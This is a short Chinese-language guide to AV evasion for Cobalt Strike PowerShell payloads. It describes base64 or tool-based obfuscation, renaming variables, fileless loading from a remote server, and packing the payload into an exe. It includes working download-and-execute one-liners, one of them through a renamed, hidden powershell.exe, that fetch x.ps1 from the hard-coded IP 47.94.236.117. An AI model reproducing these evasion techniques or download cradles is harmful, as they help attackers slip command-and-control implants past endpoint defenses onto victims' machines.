## **powershell免杀**
PS：微软defender难过


这里以cs举例：
```
方式一：CS-有效载荷-Payload生成器-Powershell   
生成./payload.psl，cmd中先powershell 再./payload.psl。或右击以powershell运行。

方式二：CS-有效载荷-Payload生成器-Powershell  Command  
生成的一串cmd命令
```
## **免杀**
**对于方式二：**

混淆加密
```
将payload.psl中关键代码加密，再解密来免杀。 如base64 或 使用专门的混淆项目。
```

分离加载/无文件落地
```
将加密的 关键代码放入云服务器
运行时去下载执行
```

将变量名，函数名，全部替换。
可能过微软defender。


^
**对于方式一：**
执行命令后会被杀软发现，禁止运行。

分离加载/无文件落地
```
将 关键代码放入云服务器
运行时去下载执行
```

加入数据干扰，混淆。
```
如：
powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2=123("http://47.94.236.117/x.ps1")'.Replace('123','adString');IEX($c1+$c2)"


如：
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe
bypass.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://47.94.236.117/x.ps1'))"


如：
使用ladon图像化版，点击PowerShell，可以选择混淆编码
如输入原始命令，在Hex混淆。
```

还是命令拦截，则打包
使用ladon图像化版打包PowerShell命令打包成exe。
使用Win-PS2EXE打包成exe，特征可能更少一点。